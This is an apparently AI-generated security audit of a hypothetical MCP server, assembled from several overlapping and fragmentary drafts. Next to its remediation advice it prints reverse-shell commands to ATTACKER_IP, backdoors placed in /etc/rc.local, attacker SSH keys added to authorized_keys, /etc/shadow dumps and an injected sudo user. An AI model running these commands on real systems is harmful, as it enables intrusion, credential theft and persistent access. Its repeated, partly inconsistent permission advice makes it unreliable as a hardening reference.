          *   **Goal:** Add attacker's public SSH key to a user's `authorized_keys` file for passwordless SSH access.
          *   **Scenario:** The `file_manager` allows writing to arbitrary file paths.
          *   **Command-line Example (Adding to a user's `authorized_keys`):**
              ```bash
              # Server prompt: "What action would you like to perform?"
              # Attacker inputs: write file
              # Server asks: "What file path?"
              # Attacker inputs: /home/<target_username>/.ssh/authorized_keys
              # Server asks: "What content?"
              # Attacker inputs: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAQC... attacker@evil.com
              # This assumes the file_manager can append or overwrite the file.
              ```

      *   **Exploitation Example (Adding Backdoor to Startup Script - `/etc/rc.local`):**
          *   **Goal:** Execute an arbitrary command (e.g., reverse shell) every time the system boots.
          *   **Scenario:** The `file_manager` allows appending content to system startup scripts, and the MCP process has permissions to modify it.
          *   **Command-line Example:**
              ```bash
              # Server prompt: "What action would you like to perform?"
              # Attacker inputs: append file
              # Server asks: "What file path?"
              # Attacker inputs: /etc/rc.local
              # Server asks: "What content?"
              # Attacker inputs: /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &
              # (This will attempt to initiate a reverse shell on boot. Requires `&` to background the process and allow boot to continue.)
              ```

      *   **Remediation Command (System-wide hardening and application logic):**
          ```bash
          # 1. Run the MCP server with the least necessary privileges.
          # 2. Implement robust authorization checks within `file_manager` to prevent unprivileged users from accessing sensitive files.
          # 3. Prevent directory traversal (e.g., `../`) in file paths and use whitelisting for allowed file operations.
          # 4. Ensure critical files and directories have restrictive permissions:
          sudo chmod 600 /etc/shadow
          sudo chown root:shadow /etc/shadow
          sudo chmod 644 /etc/passwd
          sudo chown root:root /etc/passwd
          sudo chmod 700 /etc/rc.local # Or 755 if executable, but not world-writable
          sudo chown root:root /etc/rc.local
          # Ensure user SSH directories are secure
          sudo chmod 700 /home/<username>/.ssh
          sudo chmod 600 /home/<username>/.ssh/authorized_keys
          ```

      ---

      ### 3. Privilege Escalation via `user_manager`

      *   **Vulnerability Explanation:** The `user_manager` tool is designed for managing user accounts and permissions. If an unprivileged user can directly access this tool or inject commands
      into it (via Vulnerability 1) to create new users, modify passwords, or alter group memberships (e.g., add to `sudo` group), they can easily escalate privileges.

      *   **Exploitation Example (Adding a New Sudo User via Command Injection):**
          *   **Goal:** Create a new user with administrative (sudo) privileges.
          *   **Scenario:** An attacker leverages command injection through `system_command_executor` to execute user management commands as a privileged user (e.g., `root` or a user with      
      `NOPASSWD` sudo).
          *   **Command-line Example:**
              ```bash
              # Attacker inputs into the MCP Server's prompt (assuming command injection in "run command" action):
              run command; sudo useradd -m -s /bin/bash eviluser; sudo echo "eviluser:MyStrongPassword!" | sudo chpasswd; sudo usermod -aG sudo eviluser
              # This command sequence adds a new user 'eviluser', sets their password, and grants them sudo privileges.
              ```

      *   **Remediation Command (Conceptual, focusing on `sudo` and access control):**
          ```bash
          # 1. Strictly enforce authorization for `user_manager` operations, allowing only authenticated administrators.
          # 2. Ensure `system_command_executor` (and any related tools) does not run with privileges that allow arbitrary user management.
          # 3. Regularly audit `/etc/sudoers` and `/etc/sudoers.d/*` files to prevent unauthorized or overly permissive `sudo` entries.
          sudo visudo
          # Manually remove or tighten any entries that allow unprivileged users/groups to run user management commands (`useradd`, `usermod`, `passwd`, `chpasswd`) without proper
      authentication or restrictions.
          # Ensure the MCP server's service account (if any) does not have broad sudo privileges.
          ```

      ---

      ### 4. Information Disclosure (Sensitive File Reading)

      *   **Vulnerability Explanation:** If the `file_manager` tool (or `system_command_executor` via command injection) allows reading of sensitive system files without proper authorization,  
      an attacker can gather critical reconnaissance information. This includes user account details (`/etc/passwd`), SSH server configurations (`/etc/ssh/sshd_config`), and authentication logs
      (`/var/log/auth.log`), which can be used to plan further attacks.

      *   **Exploitation Example (Reading `/etc/passwd` for User Enumeration):**
          *   **Goal:** List all system users to identify potential targets or accounts with weaker security.
          *   **Scenario:** The `file_manager` allows reading `/etc/passwd`.
          *   **Command-line Example:**
              ```bash
              # Server prompt: "What action would you like to perform?"
              # Attacker inputs: read file
              # Server asks: "What file path?"
              # Attacker inputs: /etc/passwd
              # The MCP server displays the content of /etc/passwd.
              ```

      *   **Exploitation Example (Reading `/etc/ssh/sshd_config` for Reconnaissance):**
          *   **Goal:** Understand the SSH server configuration (e.g., allowed users, root login status, port, ciphers) to identify potential vulnerabilities.
          *   **Scenario:** The `file_manager` allows reading `/etc/ssh/sshd_config`.
          *   **Command-line Example:**
              ```bash
              # Server prompt: "What action would you like to perform?"
              # Attacker inputs: read file
              # Server asks: "What file path?"
              # Attacker inputs: /etc/ssh/sshd_config
              # The MCP server displays the content of /etc/ssh/sshd_config.
              ```

      *   **Remediation Command (System-wide permissions and application logic):**
          ```bash
          # 1. Implement strict authorization checks within the `file_manager` to ensure users can only read files they are explicitly permitted to access. Adopt a deny-by-default policy.      
          # 2. Ensure default system file permissions are maintained for sensitive files:
          sudo chmod 644 /etc/passwd
          sudo chmod 644 /etc/ssh/sshd_config
          sudo chmod 640 /var/log/auth.log # Often readable by 'adm' group, but not world-readable
          sudo chown root:root /etc/passwd
          sudo chown root:root /etc/ssh/sshd_config
          sudo chown syslog:adm /var/log/auth.log
          ```

      ---

      ### 5. Persistent Backdoor Installation (Startup Scripts and SSH Authorized Keys)

      *   **Vulnerability Explanation:** By abusing write access through `file_manager` or command injection, an attacker can establish persistent access to the system. This can be achieved by 
      modifying system-wide startup scripts (e.g., `/etc/rc.local`, files in `/etc/init.d/`) to execute malicious commands on boot, or by adding their public SSH key to a user's (especially    
      `root`'s) `~/.ssh/authorized_keys` file for passwordless SSH access.

      *   **Exploitation Example (Adding Reverse Shell to `/etc/rc.local` for Persistence):**
          *   **Goal:** Ensure a reverse shell connection is established every time the system reboots.
          *   **Scenario:** An attacker has write access to `/etc/rc.local` via `file_manager` or `system_command_executor`.
          *   **Command-line Example:**
              ```bash
              # Attacker inputs into the MCP Server's prompt (assuming command injection into `system_command_executor`):
              run command; echo '/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &' >> /etc/rc.local; chmod +x /etc/rc.local
              # This appends a backgrounded reverse shell command to /etc/rc.local.
              ```

      *   **Exploitation Example (Adding Attacker's SSH Key to `root`'s `authorized_keys` for Direct Root Access):**
          *   **Goal:** Gain direct, passwordless SSH access as the `root` user.
          *   **Scenario:** An attacker has elevated privileges (e.g., through a prior exploit) and can write to `/root/.ssh/authorized_keys`.
          *   **Command-line Example:**
              ```bash
              # Attacker inputs into the MCP Server's prompt (assuming command injection into `system_command_executor` with root privileges):
              run command; mkdir -p /root/.ssh; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAQC... attacker@evil.com" >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys; chmod 700  
      /root/.ssh/
              ```

      *   **Remediation Command (System-wide permissions and File Integrity Monitoring):**
          ```bash
          # 1. Enforce strict permissions on all system startup scripts and SSH configuration files/directories.
          # 2. Regularly audit these files for unauthorized modifications.
          # 3. Implement File Integrity Monitoring (FIM) to detect changes to critical files and directories.
          # Secure /etc/rc.local:
          sudo chown root:root /etc/rc.local
          sudo chmod 700 /etc/rc.local
          # Secure root's SSH directory:
          sudo chown root:root /root/.ssh
          sudo chmod 700 /root/.ssh
          sudo chown root:root /root/.ssh/authorized_keys
          sudo chmod 600 /root/.ssh/authorized_keys
          # Example FIM installation (AIDE):
          sudo apt update && sudo apt install -y aide
          sudo aide --init # Initialize the database
          sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db # Move new database to active
          # To check for changes:
          # sudo aide --check

      on its assumed tools, prompts, resources, and accessible directories. My analysis focuses on how these components could be exploited using basic shell and Unix tools.

      ---

      ### **Vulnerability 1: Command Injection via `system_command_executor` tool and "What action would you like to perform?" prompt**

      *   **Vulnerability Description**: The `system_command_executor` tool, if directly processing user input from the "What action would you like to perform?" prompt without proper
      sanitization, is highly susceptible to command injection. An attacker can append arbitrary shell commands using metacharacters (e.g., `;`, `|`, `&&`) to achieve various malicious goals.  
      *   **Affected (Tool, Prompt, Resource)**: (`system_command_executor`, "What action would you like to perform?", Any accessible resource or directory)

      *   **Command-line Example (Exploitation)**: Gaining a reverse shell for callback.
          ```bash
          # Attacker's input to the MCP server when prompted for an action/command:
          list files; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
          ```
          *   **Explanation**: This input attempts to execute the `list files` command, then immediately initiates a reverse shell connection back to the attacker's machine (`ATTACKER_IP` on   
      port `4444`). The attacker would have a `netcat` listener set up on their machine to receive the connection.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "netcat reverse shell command", specifically examples like `nc -lvp 4444` and `/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`.
              *   Reference: SANS Institute. (n.d.). *Reverse Shell Cheat Sheet*. Retrieved from various online security resources and tutorials on Netcat usage.

      *   **Remediation Command (Conceptual)**: Implement strict input validation and sanitization. The remediation is primarily at the application code level, not a direct shell command.      
          ```
          # Conceptual Remediation Principle: Input Validation and Sanitization
          # Instead of direct execution like:
          # os.system(user_input)
          #
          # Or:
          # subprocess.run(f"some_command {user_input}", shell=True)
          #
          # Implement whitelisting or robust escaping:
          #
          # Example using Python's shlex.quote for escaping command arguments (if arguments are dynamic):
          # import shlex
          # safe_arg = shlex.quote(user_provided_argument)
          # subprocess.run(["ls", "-l", safe_arg], shell=False)
          #
          # For allowing specific commands, use a whitelist:
          # if user_action == "list files":
          #     subprocess.run(["ls", "-l"])
          # elif user_action == "run custom script":
          #     # Only allow execution of pre-defined, safe scripts
          #     subprocess.run(["/usr/local/bin/safe_script.sh", user_input_for_script])
          # else:
          #     log_and_reject_invalid_action()
          ```

      ### **Vulnerability 2: Insecure file operations via `file_manager` tool with access to sensitive system files**

      *   **Vulnerability Description**: If the `file_manager` tool allows arbitrary read/write/delete operations on sensitive system files without enforcing strict access controls or input    
      validation (e.g., path traversal checks), an attacker can access confidential information, gain persistent access, or introduce backdoors.
      *   **Affected (Tool, Prompt, Resource)**: (`file_manager`, "What action would you like to perform?", `/etc/passwd`, `/etc/shadow`, `~/.ssh/authorized_keys`, `/root/.bashrc`,
      `/etc/rc.local`, `/etc/init.d/*`)

      #### **Exploitation Example 2.1: Dumping password hashes from `/etc/shadow`**

      *   **Goal**: Information Disclosure, Privilege Escalation (through offline cracking).
      *   **Command-line Example (Attacker)**:
          ```bash
          # Attacker's input to the MCP server:
          read file /etc/shadow
          ```
          *   **Explanation**: This command attempts to read the `/etc/shadow` file, which contains hashed user passwords. If the `file_manager` runs with sufficient privileges (e.g., as root),
      it will return the contents, allowing the attacker to attempt offline password cracking.

      #### **Exploitation Example 2.2: Adding an SSH public key to `~/.ssh/authorized_keys` for persistent access**

      *   **Goal**: Gaining Access, Persistence.
      *   **Command-line Example (Attacker)**:
          ```bash
          # Attacker's input to the MCP server:
          write to file /home/<username>/.ssh/authorized_keys with content 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@example.com'
          ```
          *   **Explanation**: The attacker writes their public SSH key into the `authorized_keys` file of a target user (e.g., `<username>` or `root`). This grants the attacker SSH access to  
      the system as that user without needing a password.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "add ssh key authorized_keys backdoor", "ssh authorized_keys for access".
              *   Reference: Standard SSH key authentication documentation.

      #### **Exploitation Example 2.3: Adding a backdoor to `/etc/rc.local` for persistent root access**

      *   **Goal**: Adding Backdoors, Persistence, Privilege Escalation.
      *   **Command-line Example (Attacker)**:
          ```bash
          # Attacker's input to the MCP server:
          append to file /etc/rc.local with content 'chmod +x /tmp/backdoor.sh; /tmp/backdoor.sh &'
          # Followed by (if separate commands or capabilities):
          write to file /tmp/backdoor.sh with content '#!/bin/bash\n/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
          ```
          *   **Explanation**: The attacker first writes a simple reverse shell script to `/tmp/backdoor.sh`. Then, they append a command to `/etc/rc.local` (a system startup script) to make   
      the backdoor script executable and run it on boot. This ensures that the reverse shell is established every time the system starts, providing persistent access.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "rc.local reverse shell persistence", "linux persistence mechanisms".
              *   Reference: Various penetration testing and system hardening guides.

      *   **Remediation Commands (for 2.1, 2.2, 2.3)**: Implement strict access control, path validation, and the principle of least privilege for the `file_manager` tool.

          1.  **Restrict File Permissions**: Ensure sensitive files have minimal read/write permissions.
              ```bash
              sudo chmod 640 /etc/shadow # Read by root, group shadow
              sudo chown root:shadow /etc/shadow
              sudo chmod 600 /etc/ssh/sshd_config # Read/write by root only
              sudo chown root:root /etc/ssh/sshd_config
              sudo chmod 600 /home/<username>/.ssh/authorized_keys # User read/write only
              sudo chown <username>:<username> /home/<username>/.ssh/authorized_keys
              sudo chmod 750 /etc/rc.local # Executable by root, read by group
              sudo chown root:root /etc/rc.local
              ```
          2.  **Path Validation in `file_manager`**: Prevent path traversal attacks and ensure operations only occur in sanctioned directories.
              ```
              # Conceptual Remediation Principle: Path Validation
              # Before any file operation, canonicalize the path and check against a whitelist:
              # import os
              # requested_path = user_input_path
              # absolute_path = os.path.abspath(os.path.join(base_directory, requested_path))
              #
              # if not absolute_path.startswith(base_directory):
              #     raise PermissionError("Path traversal attempt detected!")
              #
              # # Further checks for sensitive files:
              # if absolute_path in ["/etc/shadow", "/etc/passwd"]:
              #     if not is_admin_user(current_user): # Custom authorization check
              #         raise PermissionError("Access denied to sensitive file.")
              ```
          3.  **Principle of Least Privilege**: Run the `file_manager` process with the lowest possible user privileges, and use granular authorization checks for each file operation.

      ### **Vulnerability 3: Insecure network scanning with `network_scanner` leading to potential information disclosure or DoS**

      *   **Vulnerability Description**: If the `network_scanner` tool allows arbitrary target specifications (IP addresses, ranges, domains) without restrictions or rate limiting, an attacker 
      can use it for extensive internal network reconnaissance, mapping the network topology, discovering active hosts, and identifying open ports and services. It could also be abused for     
      denial-of-service (DoS) attacks if the scanning is aggressive and unthrottled.
      *   **Affected (Tool, Prompt, Resource)**: (`network_scanner`, "What action would you like to perform?", Internal network (implicit resource))

      *   **Command-line Example (Exploitation)**: Internal network reconnaissance.
          ```bash
          # Attacker's input to the MCP server:
          scan network 192.168.1.0/24
          ```
          *   **Explanation**: The attacker instructs the `network_scanner` to scan an entire internal subnet (e.g., `192.168.1.0/24`). The output would reveal live hosts, their open ports, and
      potentially services running, providing critical information for lateral movement within the network.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "nmap internal network reconnaissance example", "subnet scanning commands".
              *   Reference: Nmap official documentation and common penetration testing methodologies.

      *   **Remediation Commands (Conceptual)**: Restrict `network_scanner` functionality, implement target whitelisting, and enforce rate limiting.

          1.  **Target Whitelisting**: Configure the `network_scanner` to only operate on pre-defined, safe IP ranges (e.g., localhost) or specific, explicitly approved external domains. Reject
      any user-provided arbitrary IP ranges or internal network segments.
          2.  **Rate Limiting**: Implement rate limiting on scanning requests to prevent abuse and DoS.
          3.  **Logging**: Log all scan requests, including the source user and target, for auditing purposes.
          4.  **Isolation**: Run the `network_scanner` in a sandboxed environment (e.g., container, separate VLAN) with limited network visibility to protect the internal network.
          *   **Source Citation (Vulnerability)**:
              *   DuckDuckGo: "network scanning as reconnaissance vulnerability", "internal network mapping security risk".
              *   Reference: SANS Institute whitepapers on network reconnaissance and security.

              *   DuckDuckGo: "secure network scanner configuration", "preventing internal network reconnaissance".
              *   Reference: Network security best practices, such as those from NIST or SANS.

      ---

      ### **Vulnerability 4: Privilege Escalation/Account Manipulation via `user_manager` tool**

      *   **Vulnerability Description**: If the `user_manager` tool allows adding/deleting users or modifying user permissions (e.g., adding to `sudo` group) without robust authentication,     
      authorization, and auditing, an attacker can create new privileged accounts or escalate the privileges of existing accounts, leading to complete system compromise.
      *   **Affected (Tool, Prompt, Resource)**: (`user_manager`, "What action would you like to perform?", `/etc/passwd`, `/etc/shadow`)

      *   **Command-line Example (Exploitation)**: Creating a new root-equivalent user.
          ```bash
          # Attacker's input to the MCP server:
          add user 'eviluser' with password 'pwnedpass' to group 'sudo'
          ```
          *   **Explanation**: The attacker uses the `user_manager` to create a new user named `eviluser` with a specified password and adds them to the `sudo` group. This grants `eviluser`    
      root privileges, allowing the attacker full control over the system.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "add user to sudo group command", "create new root user linux".
              *   Reference: Linux `useradd`, `usermod` commands, and sudoers configuration.

      *   **Remediation Commands (Conceptual)**: Implement strong authentication, granular authorization, and comprehensive auditing for `user_manager` actions.

          1.  **Strong Authentication**: Enforce multi-factor authentication (MFA) for any administrative actions performed via the `user_manager` tool.
          2.  **Granular Authorization**: Implement Role-Based Access Control (RBAC) to ensure only highly privileged and explicitly authorized administrators can perform user management tasks.
          3.  **Comprehensive Auditing**: Log all `user_manager` actions, including the user, timestamp, and specific changes made (e.g., user added, user deleted, group modification).
              ```bash
              # Example using auditd to log changes to critical user files:
              sudo apt-get install auditd # On Debian/Ubuntu
              sudo systemctl enable auditd
              sudo systemctl start auditd
              sudo auditctl -w /etc/passwd -p wa -k passwd_changes # Log writes/attribute changes to passwd
              sudo auditctl -w /etc/shadow -p wa -k shadow_changes # Log writes/attribute changes to shadow
              sudo auditctl -w /etc/group -p wa -k group_changes   # Log writes/attribute changes to group
              sudo auditctl -w /etc/sudoers -p wa -k sudoers_changes # Log writes/attribute changes to sudoers
              sudo service auditd restart
              ```

      ### **Vulnerability 5: Information Disclosure/Data Exfiltration via `file_manager` and access to `/var/log/auth.log` or web server roots**

      *   **Vulnerability Description**: If the `file_manager` allows unauthorized reading of log files like `/var/log/auth.log` or content from web server roots like `/var/www/html/`, an      
      attacker can gather sensitive operational information, enumerate usernames, or exfiltrate web application source code and configuration files.
      *   **Affected (Tool, Prompt, Resource)**: (`file_manager`, "What action would you like to perform?", `/var/log/auth.log`, `/var/www/html/`)

      #### **Exploitation Example 5.1: Reading authentication logs for username enumeration**

      *   **Goal**: Information Disclosure, Reconnaissance.
      *   **Command-line Example (Attacker)**:
          ```bash
          # Attacker's input to the MCP server:
          read file /var/log/auth.log
          ```
          *   **Explanation**: Reading the `auth.log` file can expose attempted logins, including valid and invalid usernames. This information is valuable for an attacker attempting to        
      enumerate valid user accounts on the system, which can then be used in brute-force or social engineering attacks.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "username enumeration from auth.log", "read authentication logs linux".
              *   Reference: Various ethical hacking and penetration testing guides.

      #### **Exploitation Example 5.2: Exfiltrating web application source code from `/var/www/html/`**

      *   **Goal**: Data Exfiltration, Information Disclosure.
      *   **Command-line Example (Attacker)**:
          ```bash
          # Attacker's input to the MCP server:
          read directory /var/www/html/
          read file /var/www/html/index.php
          ```
          *   **Explanation**: By reading the contents of the web server root and its files, an attacker can exfiltrate sensitive web application source code, configuration files (e.g.,        
      database credentials), and other proprietary information.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "web server source code disclosure vulnerability", "read web root files".
              *   Reference: OWASP Top 10 A01:2021-Broken Access Control and A03:2021-Injection (for potential config file vulnerabilities).

      *   **Remediation Commands**: Implement strict access control for log and web server directories, and ensure proper file permissions.

          1.  **Restrict Log File Permissions**: Limit read access to log files to authorized users/groups.
              ```bash
              sudo chmod 640 /var/log/auth.log
              sudo chown root:adm /var/log/auth.log # Only root and members of 'adm' group can read
              ```
          2.  **Secure Web Server Directory Permissions**: Ensure web server content has appropriate permissions to prevent unauthorized reading or writing.
              ```bash
              sudo chmod -R 755 /var/www/html # Directories
              sudo find /var/www/html -type f -exec sudo chmod 644 {} \; # Files
              sudo chown -R www-data:www-data /var/www/html # Owner and group for web server
              ```
          3.  **Input Validation and Authorization for `file_manager`**: Ensure the `file_manager` tool performs robust checks before allowing access to these directories.

DEBUG ## MCP Server Security Audit Report

      **Date:** 2025-10-04

      This report details vulnerabilities identified in the MCP Server's assumed implementation, focusing on interactions with its provided tools, prompts, resources, and accessible
      directories. The analysis adopts a hacker's mindset, aiming to expose potential avenues for unauthorized access, lateral movement, credential dumping, backdoor installation, and system   
      compromise.

      ---

      ### 1. Command Injection via `system_command_executor`

      *   **Vulnerability Explanation:** The `system_command_executor` tool allows the MCP Server to run arbitrary shell commands. If user input from prompts (e.g., "What action would you like 
      to perform?") is not meticulously sanitized, an attacker can inject shell metacharacters (e.g., `;`, `|`, `&`, `$(...)`) to execute arbitrary commands. This is a critical vulnerability   
      that can lead to full system compromise.

      *   **Exploitation Examples:**

          *   **Gaining a Reverse Shell (Callback):**
              An attacker, when prompted for a command or action, could input:
              ```bash
              list files; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
              ```
              This command would first execute `list files` (or any dummy command) and then immediately establish a reverse shell connection to `ATTACKER_IP` on port `4444`, granting the       
      attacker interactive shell access.

          *   **Dumping Sensitive Files (e.g., `/etc/shadow`):**
              If the MCP process runs with sufficient privileges (e.g., as root), an attacker could inject:
              ```bash
              run command; cat /etc/shadow > /tmp/shadow_dump.txt; chmod 644 /tmp/shadow_dump.txt;
              ```
              This would dump the hashed passwords from `/etc/shadow` into `/tmp/shadow_dump.txt`, which could then be retrieved via other means (e.g., `file_manager`).

          *   **Adding an Attacker's SSH Key for Persistence:**
              An attacker could inject a command to add their public SSH key to a user's `authorized_keys` file:
              ```bash
              run command; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAQC... attacker@evil.com" >> ~/.ssh/authorized_keys
              ```
              This grants the attacker persistent, passwordless SSH access to the system.

      *   **Remediation Steps:**
          1.  **Strict Input Validation and Sanitization:** Implement robust input validation to filter out or escape all shell metacharacters from user-provided input before it is passed to   
      `system_command_executor`. Whitelisting allowed commands and arguments is preferred over blacklisting.
          2.  **Principle of Least Privilege:** Run the MCP server and its associated processes (including `system_command_executor`) with the lowest possible user privileges. If `sudo` is     
      used, restrict `sudoers` entries to specific, whitelisted commands with no arguments or carefully controlled arguments.
          3.  **Avoid Direct Shell Execution:** Whenever possible, avoid constructing shell commands by concatenating user input directly. Instead, use specific API calls or subprocess
      execution with `shell=False` and properly quoted arguments.

      ---

      ### 2. Insecure File Operations via `file_manager`

      *   **Vulnerability Explanation:** The `file_manager` tool's ability to read, write, and delete files, if lacking proper authorization checks, path sanitization, and privilege
      enforcement, can lead to severe compromises. Attackers can read sensitive system files, modify critical configurations, or inject malicious code for persistence.

      *   **Exploitation Examples:**

          *   **Dumping Password Hashes from `/etc/shadow`:**
              An attacker could use the `file_manager` to read the `/etc/shadow` file directly:
              ```
              read file /etc/shadow
              ```
              If the `file_manager` operates with sufficient privileges, the contents (hashed passwords) would be disclosed.

          *   **Adding Attacker's SSH Public Key for Persistent Access:**
              An attacker could write their public SSH key to any user's `~/.ssh/authorized_keys` file, including `root`'s:
              ```
              write to file /home/<username>/.ssh/authorized_keys with content 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@example.com'
              ```
              This grants the attacker persistent SSH access to the system as the target user.

          *   **Adding a Backdoor to a System Startup Script (e.g., `/etc/rc.local`):**
              An attacker could append a malicious command (e.g., a reverse shell) to a system startup script:
              ```
              append to file /etc/rc.local with content '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &'
              ```
              This ensures the backdoor executes every time the system boots, providing persistent access.

          *   **Exfiltrating Web Application Source Code:**
              If `/var/www/html/` is accessible, an attacker could read sensitive web application files:
              ```
              read directory /var/www/html/
              read file /var/www/html/config.php
              ```
              This could expose database credentials, API keys, or proprietary application logic.

      *   **Remediation Steps:**
          1.  **Robust Authorization Checks:** Implement strict Role-Based Access Control (RBAC) within `file_manager` to ensure users can only access files and directories they are explicitly 
      authorized to. Adopt a "deny-by-default" policy.
          2.  **Path Validation:** Prevent directory traversal attacks (e.g., `../`) by canonicalizing paths and verifying that all operations occur within a sanctioned base directory.
      Whitelist specific, safe file paths and operations.
          3.  **Principle of Least Privilege:** Ensure the `file_manager` process runs with the lowest possible user privileges, and use granular authorization for individual file operations.  
          4.  **Enforce System File Permissions:** Regularly audit and enforce restrictive file permissions on sensitive system files and directories (`/etc/shadow`, `/etc/passwd`,
      `/etc/ssh/sshd_config`, `~/.ssh/authorized_keys`, `/etc/rc.local`, `/var/log/auth.log`).
              ```bash
              sudo chmod 640 /etc/shadow; sudo chown root:shadow /etc/shadow
              sudo chmod 600 /etc/ssh/sshd_config; sudo chown root:root /etc/ssh/sshd_config
              sudo chmod 600 /home/<username>/.ssh/authorized_keys; sudo chown <username>:<username> /home/<username>/.ssh/authorized_keys
              sudo chmod 700 /etc/rc.local; sudo chown root:root /etc/rc.local
              sudo chmod 640 /var/log/auth.log; sudo chown root:adm /var/log/auth.log
              ```
          5.  **File Integrity Monitoring (FIM):** Implement FIM solutions (e.g., AIDE) to detect unauthorized changes to critical system files and directories.

      ### 3. Privilege Escalation via `user_manager`

      *   **Vulnerability Explanation:** The `user_manager` tool's functionality for managing user accounts and permissions, if not securely controlled, presents a direct path to privilege     
      escalation. An attacker could exploit this to create new privileged users, modify existing user permissions (e.g., add to the `sudo` group), or change passwords.

      *   **Exploitation Example:**

          *   **Creating a New Sudo User:**
              If an attacker gains command injection capabilities or direct access to `user_manager` operations, they could create a new user with administrative privileges:
              ```bash
              add user 'eviluser' with password 'MyStrongPassword!' to group 'sudo'
              ```
              Alternatively, via command injection combined with `system_command_executor`:
              ```bash
              run command; sudo useradd -m -s /bin/bash eviluser; sudo echo "eviluser:MyStrongPassword!" | sudo chpasswd; sudo usermod -aG sudo eviluser
              ```
              This grants the attacker full root access to the system through the newly created `eviluser` account.

      *   **Remediation Steps:**
          1.  **Strong Authentication and Authorization:** Enforce multi-factor authentication (MFA) and granular Role-Based Access Control (RBAC) for all `user_manager` operations. Only       
      explicitly authorized administrators should be able to perform user management tasks.
          2.  **Strict Sudoers Configuration:** Regularly audit and tighten `/etc/sudoers` and `/etc/sudoers.d/*` files to prevent unprivileged users or groups from executing user management   
      commands (`useradd`, `usermod`, `passwd`) without proper authentication or restrictions. Ensure the MCP server's service account does not have broad sudo privileges.
          3.  **Comprehensive Auditing:** Implement robust logging for all `user_manager` actions, capturing who performed the action, what changes were made, and when. Utilize `auditd` to     
      monitor changes to critical user-related files (`/etc/passwd`, `/etc/shadow`, `/etc/group`, `/etc/sudoers`).
              ```bash
              sudo auditctl -w /etc/passwd -p wa -k passwd_changes
              sudo auditctl -w /etc/shadow -p wa -k shadow_changes
              sudo auditctl -w /etc/sudoers -p wa -k sudoers_changes
              ```

      ---

      ### 4. Information Disclosure via `network_scanner`

      *   **Vulnerability Explanation:** If the `network_scanner` tool allows arbitrary target specifications (IP addresses, ranges, domains) without restrictions or rate limiting, it can be   
      abused for extensive internal network reconnaissance. An attacker can map network topology, discover active hosts, identify open ports and services, which is crucial for planning lateral 
      movement and further attacks. It could also be used for Denial of Service (DoS) if scanning is aggressive.

      *   **Exploitation Example:**

          *   **Internal Network Reconnaissance:**
              An attacker could instruct the `network_scanner` to scan an entire internal subnet:
              ```
              scan network 192.168.1.0/24
              ```
              The output would reveal live hosts, their open ports, and potentially services running, providing a detailed map of the internal network.

      *   **Remediation Steps:**
          1.  **Target Whitelisting:** Restrict the `network_scanner` to operate only on pre-defined, safe IP ranges (e.g., localhost or explicitly approved external domains). Reject any       
      user-provided arbitrary internal network segments.
          2.  **Rate Limiting:** Implement rate limiting on scanning requests to prevent abuse and potential DoS attacks.
          3.  **Logging:** Log all scan requests, including the initiating user and the target, for auditing and incident response.
          4.  **Isolation/Sandboxing:** Run the `network_scanner` in a sandboxed environment (e.g., a container or a separate VLAN) with limited network visibility to protect the internal      
      network.

      ---

      ### 5. Persistent Backdoor Installation (Startup Scripts and SSH Authorized Keys)

      *   **Vulnerability Explanation:** This vulnerability overlaps with command injection and insecure file operations but highlights the critical goal of persistence. By abusing write access
      (via `file_manager` or command injection into `system_command_executor`), an attacker can establish long-term access by modifying system-wide startup scripts or user-specific SSH
      configurations.

      *   **Exploitation Examples:**

          *   **Adding a Reverse Shell to `/etc/rc.local` for Persistence:**
              An attacker with write access to `/etc/rc.local` (or similar startup scripts in `/etc/init.d/`) could append:
              ```bash
              echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> /etc/rc.local; chmod +x /etc/rc.local
              ```
              This ensures a reverse shell connects to the attacker every time the system boots.

          *   **Adding Attacker's SSH Key to `root`'s `authorized_keys` for Direct Root Access:**
              If an attacker obtains elevated privileges, they can write their public key to `/root/.ssh/authorized_keys`:
              ```bash
              mkdir -p /root/.ssh; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAQC... attacker@evil.com" >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys; chmod 700 /root/.ssh/   
              ```
              This provides direct, passwordless SSH access as the `root` user.

      *   **Remediation Steps:**
          1.  **Strict Permissions:** Enforce highly restrictive permissions on all system startup scripts and SSH configuration files/directories.
              ```bash
              sudo chown root:root /etc/rc.local; sudo chmod 700 /etc/rc.local
              sudo chown root:root /root/.ssh; sudo chmod 700 /root/.ssh
              sudo chown root:root /root/.ssh/authorized_keys; sudo chmod 600 /root/.ssh/authorized_keys
              ```
          2.  **File Integrity Monitoring (FIM):** Implement FIM solutions to actively monitor and alert on any unauthorized changes to these critical files and directories.
          3.  **Regular Audits:** Conduct regular security audits of all startup scripts, cron jobs, and SSH authorized keys files for suspicious entries.
          4.  **Disable Unused Services:** Disable any unnecessary services or startup mechanisms that could be abused for persistence.

      ---

      **Conclusion:**

      The MCP Server, as described, exhibits critical vulnerabilities primarily due to the powerful capabilities of its `system_command_executor` and `file_manager` tools, especially when      
      coupled with potentially insecure prompt handling and broad access to system resources. Robust input validation, strict access controls (Principle of Least Privilege and RBAC),
